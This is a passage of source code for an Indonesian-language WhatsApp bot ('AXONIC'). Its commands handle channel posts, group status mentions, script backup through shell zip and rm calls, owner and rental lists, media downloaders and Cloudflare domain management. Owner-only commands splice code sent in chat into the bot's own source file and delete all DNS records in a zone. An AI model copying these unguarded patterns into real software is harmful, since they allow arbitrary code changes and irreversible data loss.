if (/image/.test(mime)) res = await Xuu.downloadAndSaveMediaMessage(qmsg)
let content = res !== undefined ? { image: {url: res}, caption: text } : { text: text }
await Xuu.sendMessage(idSaluran, content)
reply("Berhasil mengirim pesan ke dalam channel whatsapp")
if (res !== undefined) await fs.unlinkSync(res)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upswtag": {
if (!isOwner) return Reply(mess.owner)
if (!text) return reply(example("text & bisa dengan kirim foto"))
if (/image/.test(mime)) global.imgsw = qmsg
const meta = await Xuu.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textupsw = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.create-storywa ${i}|${meta[i].subject}`, 
description: `${meta[i].participants.length} Member`
})
}
return Xuu.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© AXONIC V10`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Tag\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "create-storywa": {
if (!isCreator) return Reply(mess.owner)
if (global.textupsw == undefined) return

async function mentionStatus(jids, content) {
    let colors = ['#7ACAA7', '#6E257E', '#5796FF', '#7E90A4', '#736769', '#57C9FF', '#25C3DC', '#FF7B6C', '#55C265', '#FF898B', '#8C6991', '#C69FCC', '#B8B226', '#EFB32F', '#AD8774', '#792139', '#C1A03F', '#8FA842', '#A52C71', '#8394CA', '#243640'];
    let fonts = [0];
    let user = await Xuu.groupMetadata(jids)
    let users = user.participants.map(v => v.id)

    let message = await Xuu.sendMessage(
        "status@broadcast", 
        content, 
        {
            backgroundColor: colors[Math.floor(Math.random() * colors.length)], 
            font: fonts[Math.floor(Math.random() * fonts.length)], 
            statusJidList: users, 
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{
                                tag: "to",
                                attrs: { jid: jids },
                                content: undefined,
                            }]
                        },
                    ],
                },
            ],
        }
    );
        await Xuu.relayMessage(
            jids, 
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: message.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                userJid: Xuu.user.jid,
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined,
                    },
                ],
            }
        )
}

const teks = global.textupsw
let jid = text.split("|")[0]
let nama = text.split("|")[1]

if (global.imgsw !== undefined) {
media = await Xuu.downloadAndSaveMediaMessage(global.imgsw)
await mentionStatus(jid, {
  image: { url: media }, 
  caption: teks
});
await fs.unlinkSync(media)
} else {
await mentionStatus(jid, {
  text: teks
});
}
return reply(`Berhasil membuat status tag grup ${nama}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "backup": case "ambilsc": case "backupsc": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await reply("Memproses backup script bot")
var name = `AXONIC-${global.versi}`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Xuu.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return reply("Script bot berhasil dikirim ke private chat")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
reply("Berhasil mereset database ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

/*case "setppbot": {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await Xuu.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await Xuu.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await Xuu.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break*/

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
Xuu.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listowner": case "listown": {
if (owners.length < 1) return reply("Tidak ada owner tambahan")
let teks = ` *── List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Xuu.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
reply(`Berhasil menghapus owner ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
reply(`Berhasil menambah owner ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
			
case "delsewa": case "hapussewa": case "removesewa": {
    if (!text) return reply("Contoh: .delsewa idgc");

    let id = args[0];
    if (!id.includes("@g.us")) return reply("Bukan ID grup yang valid.");
    
    let dts = await readSewa();
    
    if (!dts[id]) {
        return reply("Grup ini tidak terdaftar dalam data sewa.");
    }

    delete dts[id]; 
    await writeSewa(dts);

    await reply(`Sewa untuk grup ${id} telah berhasil dihapus.`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listsewa": case "sewalist": case "sewagclist": {
  let da = await readSewa()
 let tx = "*List grub yang menyewa bot:*\n\n"
 function msToDate(ms) {
        let date = new Date(ms);
        return `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
    }
  if (!da) return reply("tidak ada grub yang menyewa")
  for (let a of Object.keys(da)) {
    let k = da[a]
    tx += `${a}: ${msToDate(k.expired)}\n`
  }
  m.reply(tx.trim())
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addsewa": case "sewagc": case "tambahsewa": {
    function convertDaysToMs(days) {
        return days * 24 * 60 * 60 * 1000;
    }

    function msToDate(ms) {
        let date = new Date(ms);
        return `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
    }

    if (!text) return reply("Contoh: .addsewa idgc 10\n10 itu 10 hari.");
    if (!args[0].includes("@g.us")) return reply("Bukan ID grup yang valid.");
    
    await reply("Proses...");
    let id = args[0];
    let waktuSekarang = Date.now();
    let waktu;

    if (!isNaN(Number(args[1])) && Number(args[1]) > 0) {
        waktu = waktuSekarang + convertDaysToMs(Number(args[1]));
        await reply("Converting expired...")
    } else {
        return reply("Pastikan memasukkan jumlah hari yang benar. Kalau tidak, gw bom lu 😊");
    }

    let dts = await readSewa();
    dts[id] = {
        expired: waktu
    };

    await writeSewa(dts);
    await reply("Berhasil menambahkan grup.\nExpired: " + msToDate(waktu))
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'fb':
case 'fbdl':
case 'facebook': {
  try {
    if (!text) return reply(`Contoh: ${prefix+command} linknya`)
    if (!text.includes('facebook.com')) return reply('Harus berupa link facebook!')
    let jor = await fetchJson(`https://vapis.my.id/api/fbdl?url=${encodeURIComponent(text)}`)
        await Xuu.sendMessage(m.chat, {
          video: {
            url: jor.data.sd_url
          },
          caption: `sukses👍`
        }, {
          quoted: qloc
        })
  } catch (err) {
  try {
    let jor = await fetchJson(`https://vapis.my.id/api/fbdl?url=${encodeURIComponent(text)}`)
        await Xuu.sendMessage(m.chat, {
          video: {
            url: jor.data.sd_udl
          },
          caption: ``
        }, {
          quoted: qloc
        })
  } catch (err) {
    console.error('Kesalahan pada API:', err)
    reply('Terjadi kesalahan')
  }}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'pastebin': {
  if (!args[0]) return reply(`Contoh: ${prefix+command} linknya`)
  const pe = await axios.get(`https://vapis.my.id/api/pastebin?url=${args[0]}`)
  const pasteData = pe.data.data
  m.reply(pasteData)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'opentime': {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
  const timeUnits = {
    detik: 1000,
    menit: 60000,
    jam: 3600000,
    hari: 86400000
  };
  const unit = args[1]?.toLowerCase();
  const multiplier = timeUnits[unit];
  const duration = parseInt(args[0]);
  if (!multiplier || isNaN(duration) || duration <= 0) {
    return reply(`Pilih:\nDetik\nMenit\nJam\nHari\n\nContoh: ${command} 10 detik`);
  }
  const timer = duration * multiplier;
  reply(`Open time ${duration} ${unit} dimulai dari sekarang!`);
  const sendReminder = (message, delay) => {
    if (timer > delay) {
      setTimeout(() => {
        m.reply(message);
      }, timer - delay);
    }
  };
  sendReminder(`Pengingat: 10 detik lagi grup akan dibuka!`, 10000);
  setTimeout(() => {
    const open = `*[ OPEN TIME ]* Grup telah dibuka!`;
    Xuu.groupSettingUpdate(m.chat, 'not_announcement');
    m.reply(open);
  }, timer);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'closetime': {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
  const timeUnits = {
    detik: 1000,
    menit: 60000,
    jam: 3600000,
    hari: 86400000
  };
  const unit = args[1]?.toLowerCase();
  const multiplier = timeUnits[unit];
  const duration = parseInt(args[0]);
  if (!multiplier || isNaN(duration) || duration <= 0) {
    return reply(`Pilih:\nDetik\nMenit\nJam\nHari\n\nContoh: ${command} 10 detik`);
  }
  const timer = duration * multiplier;
  reply(`Close time ${duration} ${unit} dimulai dari sekarang!`);
  const sendReminder = (message, delay) => {
    if (timer > delay) {
      setTimeout(() => {
        m.reply(message);
      }, timer - delay);
    }
  };
  sendReminder(`Pengingat: 10 detik lagi grup akan ditutup!`, 10000);
  setTimeout(() => {
    const close = `*[ CLOSE TIME ]* Grup telah ditutup!`;
    Xuu.groupSettingUpdate(m.chat, 'announcement');
    m.reply(close);
  }, timer);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'toraw': {
  if (!text) return reply(`Contoh: ${command} link github format ori`)
  if (!text.includes('github.com')) return reply('Harus berupa link github ori!')
  function toGhRaw(url) {
    const rawUrl = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob', '');
    return rawUrl;
  }
  const raw = await toGhRaw(text)
  m.reply(raw)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'mediafire': {
   if (!isCreator) return Reply(mess.owner);
  try {
    if (!text) return reply(`Contoh: ${command} linknya`)
    if (!text.includes('mediafire.com')) return m.reply('Harus berupa link mediafire!')
    reply('Loading...')
    let api = `https://api.vreden.my.id/api/mediafiredl?url=${text}`
    let res = await fetch(api)
    let data = await res.json()
    fileNama = decodeURIComponent(data.result[0].nama)
    var media = await getBuffer(data.result[0].link)
    if (data.result[0].mime.includes('mp4')) {
      Xuu.sendMessage(m.chat, {
        document: media,
        fileName: fileNama,
        mimetype: 'video/mp4'
      }, {
        quoted: qloc
      })
    } else if (data.result[0].mime.includes('mp3')) {
      Xuu.sendMessage(m.chat, {
        document: media,
        fileName: fileNama,
        mimetype: 'audio/mp3'
      }, {
        quoted: qloc
      })
    } else {
      Xuu.sendMessage(m.chat, {
        document: media,
        fileName: fileNama,
        mimetype: 'application/' + data.result[0].mime
      }, {
        quoted: qloc
      })
    }
  } catch (err) {
    reply('Terjadi kesalahan: ' + err)
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
                
case 'addcase': {
if (!isOwner) return m.reply(mess.owner);
    const filePath = path.join(__dirname, 'PRIMEXUU.js');
    let fileContent = fs.readFileSync(filePath, 'utf8');

    let newCase = m.quoted ? m.quoted.text.trim() : text.trim();
    if (!newCase.startsWith("case '")) return m.reply('Format salah!');

    let caseMatch = newCase.match(/case\s+'([^']+)':/);
    if (!caseMatch) return reply('Gagal mengambil nama case!');
    let caseName = caseMatch[1];

    const commandPattern = /case\s+'([^']+)':/g;
    let match;
    while ((match = commandPattern.exec(fileContent)) !== null) {
        if (match[1] === caseName) return reply(`Case \`${caseName}\` sudah ada.`);
    }

    const breakPattern = /break;?\s*(\/\/.*)?$/gm;
    let breakMatch, insertIndex = -1;
    while ((breakMatch = breakPattern.exec(fileContent)) !== null) {
        insertIndex = breakMatch.index + breakMatch[0].length;
    }

    const defaultIndex = fileContent.indexOf('default:');
    if (insertIndex === -1) {
        if (defaultIndex === -1) return m.reply('Tidak dapat menemukan `default:`.');
        insertIndex = defaultIndex;
    }

    let newContent = fileContent.slice(0, insertIndex) + `\n${newCase}\n` + fileContent.slice(insertIndex);
    fs.writeFileSync(filePath, newContent, 'utf8');

    reply(`✅ Case \`${caseName}\` berhasil ditambahkan!`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'delcase': {
if (!isOwner) return m.reply(mess.owner);
    if (!text) return reply('Masukkan nama case yang ingin dihapus!');

    const filePath = path.join(__dirname, 'PRIMEXUU.js');
    let fileContent = fs.readFileSync(filePath, 'utf8');

    const casePattern = new RegExp(`case\\s+'${text}':(?:\\s*case\\s+'[^']+':)*\\s*{`, 'g');
    let match = casePattern.exec(fileContent);
    if (!match) return reply(`Case \`${text}\` tidak ditemukan.`);

    let startIndex = match.index;
    let endIndex = -1;

    for (let i = startIndex; i < fileContent.length; i++) {
        if (fileContent.substring(i, i + 6) === 'break;') {
            endIndex = i + 6;
            break;
        }
        if (fileContent.substring(i, i + 5) === 'break') {
            endIndex = i + 5;
            break;
        }
    }

    if (endIndex === -1) return reply(`Gagal menghapus case \`${text}\`.`);

    fileContent = fileContent.slice(0, startIndex) + fileContent.slice(endIndex);
    fs.writeFileSync(filePath, fileContent, 'utf8');

    reply(`✅ Case \`${text}\` berhasil dihapus!`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'cekidch': {
if (!text) return reply(("Mana Link Channnel Nya?"))
if (!text.includes("https://whatsapp.com/channel/")) return reply("Invalid link")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Xuu.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Name :* ${res.name}
* *Total Followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "verified" : "No"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "AXONIC V12" }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : qloc });
await Xuu.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addidgc": case "addgc": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return reply(example("Masukkan ID grup!"))
    if (!text.endsWith("@g.us")) return reply("ID grup tidak valid!")

    let input = text.trim()
    if (gclist.includes(input)) return reply(`ID ${input} sudah terdaftar!`)

    gclist.push(input)
    
    try {
        await fs.promises.writeFile("./library/database/gclist.json", JSON.stringify(gclist, null, 2))
        reply(`✅ Berhasil menambahkan ID grup ke dalam database!`)
    } catch (error) {
        console.error("❌ Gagal menyimpan ke database:", error)
        reply("⚠️ Terjadi kesalahan saat menyimpan ke database!")
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "donasi": {
const xuu = `primexuu-allpayment.vercel.app`
m.reply(xuu)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'ambilsw': case 'sw': {
    if (!isCreator) return reply(mess.owner)
    if (m.isGroup) return m.reply("❌ Command ini hanya bisa digunakan di chat pribadi!");

    const quotedMessage = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quotedMessage) return m.reply("📌 Balas pesan gambar/video yang ingin diambil!");

    if (quotedMessage.imageMessage) {
        let imageUrl = await Xuu.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        return Xuu.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
    }

    if (quotedMessage.videoMessage) {
        let videoUrl = await Xuu.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        return Xuu.sendMessage(m.chat, { video: { url: videoUrl } }, { quoted: m });
    }
    return reply("❌ Hanya bisa mengambil gambar atau video dari pesan yang dikutip!");
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~//

case 'crategc': {
    if (!isCreator) return reply('*Error403 Khusus Creator/Owner');
    
    let parts = text.split('|');
    let groupName = parts[0]?.trim();
    let groupDesc = parts[1]?.trim() || '';
    
    if (!groupName) {
        return m.reply(`Cara penggunaan: 
${prefix + command} NamaGroup|DeskripsiGroup

- Pisahkan nama dan deskripsi grup dengan simbol | 
- Deskripsi grup bersifat opsional

Contoh: 
${prefix + command} Grup Keren|Grup untuk diskusi keren`);
    }
    
    try {
        let groupData = await Xuu.groupCreate(groupName, []);
       
        await new Promise(resolve => setTimeout(resolve, 1000));
        
      
        if (groupDesc) {
            await Xuu.groupUpdateDescription(groupData.id, groupDesc);
        }
       
        let hasSetPicture = false;
        if (m.quoted && /image/.test(m.quoted.mimetype)) {
            try {
                let media = await m.quoted.download();
                await Xuu.updateProfilePicture(groupData.id, media);
                hasSetPicture = true;
            } catch (pictureError) {
                console.error('Error setting group picture:', pictureError);
            }
        }
        
        
        let response = await Xuu.groupInviteCode(groupData.id);
        let inviteLink = `https://chat.whatsapp.com/${response}`;
                let successDetails = [];
        successDetails.push(`✅ Grup "${groupName}" berhasil dibuat!`);
        
        if (groupDesc) {
            successDetails.push(`✅ Deskripsi grup berhasil diatur`);
        }
        
        successDetails.push(`\nLink grup: ${inviteLink}`);
        
      
        await Xuu.sendMessage(m.chat, {
            text: successDetails.join('\n'),
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999999, 
                isForwarded: true, 
                forwardedNewsletterMessageInfo: {
                    newsletterName: global.namaSaluran,
                    newsletterJid: global.idSaluran,
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: groupName,
                    body: groupDesc || 'Undangan chat grup',
                    thumbnailUrl: global.image.menu, 
                    sourceUrl: inviteLink,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        });
    } catch (error) {
        console.error('Error creating group:', error);
        reply(`Gagal membuat grup: ${error.message}`);
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'deldomaincf': case 'deldomcf': {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.includes(".")) return m.reply("domainmu.com")
const CLOUDFLARE_API_TOKEN = global.apitoken_cloudflare // Ganti dengan API Token
const CLOUDFLARE_EMAIL = global.email_cloudflare // Jika pakai API Key


async function deleteDomain(domain) {
    try {
        // Ambil Zone ID berdasarkan nama domain
        const zoneResponse = await axios.get(
            `https://api.cloudflare.com/client/v4/zones?name=${domain}`,
            {
                headers: {
                    Authorization: `Bearer ${CLOUDFLARE_API_TOKEN}`, // Jika pakai API Token
                    "X-Auth-Email": CLOUDFLARE_EMAIL, // Jika pakai API Key
                    "Content-Type": "application/json",
                },
            }
        );

        if (!zoneResponse.data.success || zoneResponse.data.result.length === 0) {
            return reply(`Domain ${domain} tidak ditemukan di Cloudflare.`);
        }

        const zoneId = zoneResponse.data.result[0].id;

        // Hapus domain berdasarkan Zone ID
        const deleteResponse = await axios.delete(
            `https://api.cloudflare.com/client/v4/zones/${zoneId}`,
            {
                headers: {
                    Authorization: `Bearer ${CLOUDFLARE_API_TOKEN}`, // Jika pakai API Token
                    "X-Auth-Email": CLOUDFLARE_EMAIL, // Jika pakai API Key
                    "Content-Type": "application/json",
                },
            }
        );

        if (deleteResponse.data.success) {
           return reply(`Berhasil menghapus domain ${domain} dari Cloudflare ✅`)
        } else {
           return reply(`Gagal menghapus domain ${domain}: ` + deleteResponse.data.errors)
        }
    } catch (error) {
        console.error("Error:", error.response ? error.response.data : error.message);
    }
}

return deleteDomain(text.toLowerCase())
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'adddomaincf': case 'adddomcf': {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.includes(".")) return m.reply("domainmu.com")
const CLOUDFLARE_TOKEN = global.apitoken_cloudflare
const CLOUDFLARE_EMAIL = global.email_cloudflare
const cloudflare = axios.create({
    baseURL: 'https://api.cloudflare.com/client/v4',
    headers: {
        'Authorization': `Bearer ${CLOUDFLARE_TOKEN}`,
        'Content-Type': 'application/json'
    }
});
async function addNewDomainToCloudflare(domainName) {
    try {
        const response = await cloudflare.post('/zones', {
            name: domainName,
            account: {
                id: global.accountid_cloudflare
            },
            plan: {
                id: 'free'
            },
            type: 'full',
            jump_start: true
        });
        return response.data
    } catch (error) {
        return 'Gagal menambahkan domain:' + JSON.stringify(error.response ? error.response.data : error.message, null, 2)
    }
}
let res = await addNewDomainToCloudflare(text.toLowerCase())
if (res?.result?.name_servers) {
let respon = `
Domain ${text.toLowerCase()} Berhasil Ditambahkan Kedalam Cloudflare ✅

*Name Server :*
* ns1 ${res.result.name_servers[0]}
* ns2 ${res.result.name_servers[1]}
`
return m.reply(respon)
} else {
return m.reply(JSON.stringify(res, null, 2))
}
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'clearsubdomain': {
if (!isCreator) return Reply(mess.owner);
if (!text || !text.includes("|")) return m.reply('zoneid|apikey')
let [apizone, apitoken] = text.split("|")
const CLOUDFLARE_API_KEY = apitoken;  // Ganti dengan API key
const CLOUDFLARE_ZONE_ID = apizone;  // Ganti dengan Zone ID

async function getAllDNSRecords() {
    let allRecords = [];
    let page = 1;
    let totalPages = 1;

    try {
        while (page <= totalPages) {
            const response = await axios.get(`https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/dns_records`, {
                params: { page, per_page: 100 },
                headers: {
                    'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`,
                    'Content-Type': 'application/json'
                }
            });

            if (!response.data.success) {
                console.error("Gagal mengambil DNS records:", response.data.errors);
                return [];
            }

            allRecords.push(...response.data.result);
            totalPages = response.data.result_info.total_pages;
            page++;
        }
    } catch (error) {
        console.error("Terjadi kesalahan saat mengambil DNS records:", error.message);
    }
    return allRecords;
}

// Fungsi untuk menghapus semua DNS record
async function deleteAllDNSRecords() {
    try {
        const records = await getAllDNSRecords();
        const totalDns = records.length

        if (records.length === 0) {
            await m.reply("Tidak ada Subdomain yang ditemukan.");
            return;
        }

        m.reply(`${totalDns} Subdomain ditemukan. Memproses penghapusan...`);

        for (const record of records) {
            try {
                const deleteResponse = await axios.delete(`https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/dns_records/${record.id}`, {
                    headers: {
                        'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`,
                        'Content-Type': 'application/json'
                    }
                });

                if (deleteResponse.data.success) {
                    console.log(`✅ Berhasil menghapus record: ${record.name} (ID: ${record.id})`);
                } else {
                    console.error(`❌ Gagal menghapus record ${record.name}:`, deleteResponse.data.errors);
                }
            } catch (error) {
                console.error(`❌ Terjadi kesalahan saat menghapus record ${record.name}:`, error.message);
            }
        }

        await reply(`Berhasil menghapus ${totalDns} Subdomain ✅`);
    } catch (error) {
        console.error("Terjadi kesalahan:", error.message);
    }
}

// Jalankan fungsi
return deleteAllDNSRecords();
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listdomaincf': case 'listdomcf': {
if (!isCreator) return Reply(mess.owner)
const CLOUDFLARE_API_KEY = global.apitoken_cloudflare // Ganti dengan API Key atau API Token
const CLOUDFLARE_EMAIL = global.email_cloudflare // Email akun Cloudflare (jika pakai API Key)

async function getAllDomains() {
    let page = 1;
    let domains = [];
    let hasMore = true;

    while (hasMore) {
        const url = `https://api.cloudflare.com/client/v4/zones?page=${page}&per_page=50`; // Maksimal 50 per halaman

        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`, // Jika pakai API Token
                // 'X-Auth-Email': CLOUDFLARE_EMAIL, // Jika pakai API Key
                // 'X-Auth-Key': CLOUDFLARE_API_KEY  // Jika pakai API Key
            }
        });

        const data = await response.json();
        
        if (data.success) {
            domains = domains.concat(data.result.map(zone => ({
                id: zone.id,
                name: zone.name,
                status: zone.status
            })));

            // Cek apakah masih ada halaman berikutnya
            hasMore = data.result_info.page < data.result_info.total_pages;
            page++;
        } else {
            console.error('Gagal mengambil daftar domain:', data.errors);
            return [];
        }
    }

    console.log('Total Domain:', domains.length);
    console.log('Daftar Domain:', domains);
    return domains;
}


// Jalankan function
let res = await getAllDomains();
if (res.length < 1) return reply("Tidak ada domain di cloudflare")
let teks = `\n*Total Domain Cloudflare :* ${res.length}\n`
for (let i of res) {
teks += `
* ${i.name}
* *Status :* ${i.status == "active" ? i.status + " ✅" : i.status == "pending" ? i.status + " 🕞" : i.status + " ❌"}
`
}
return m.reply(teks)
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'reactch': {
if (!isCreator) return reply('Khusus Owner')
if (!text) return m.reply(".reactch linkpesan 🗿🗿🗿🗿🗿🗿")
if (!args[0] || !args[1]) return reply("Wrong Format")
if (!args[0].includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = args[0].split('/')[4]
let serverId = args[0].split('/')[5]
let res = await Xuu.newsletterMetadata("invite", result)
await Xuu.newsletterReactMessage(res.id, serverId, args[1])
reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'tobase64': {
if (!text) return reply("Masukan Text Yang Mau Di Jadiin Base64")
const anu = await axios.get(`https://api.siputzx.my.id/api/tools/text2base64?text=${encodeURIComponent(text)}`)
reply(`Succes Convert Text To Base64\n\n${anu.data.data.base64}`)
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'instagram': {
    if (!text) return Reply(example("linknya"));
    if (!text.startsWith('https://')) return Reply("Link tautan tidak valid!");

    await Xuu.sendMessage(m.chat, { react: { text: '🕖', key: m.key } });

    try {
        const res = await fetchJson(`https://api.resellergaming.my.id/download/instagram?url=${encodeURIComponent(text)}`);

        // Ambil link video dari res.result[0].url_download
        const videoUrl = res?.result?.[0]?.url_download;

        if (!videoUrl) {
            console.log("Response API:", res);
            return Reply("❌ Tidak ada video yang bisa diunduh!");
        }

        await Xuu.sendMessage(
            m.chat,
            {
                video: { url: videoUrl },
                mimetype: "video/mp4",
                caption: `*Instagram Downloader ✅*\n📺 ${res.result[0].kualitas || 'Video'}`
            },
            { quoted: m }
        );

        await Xuu.sendMessage(m.chat, { react: { text: '', key: m.key } });
    } catch (e) {
        console.error("Instagram Error:", e);
        Reply("❌ Terjadi kesalahan saat mengunduh video Instagram!");
    }
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~//

case 'readqr': {
if (!/image/.test(mime)) return example("dengan reply qris")
const Jimp = require("jimp");
const QrCode = require("qrcode-reader");
async function readQRISFromBuffer(buffer) {
    return new Promise(async (resolve, reject) => {
        try {
            const image = await Jimp.read(buffer);
            const qr = new QrCode();
            qr.callback = (err, value) => {
                if (err) return reject(err);
                resolve(value ? value.result : null);
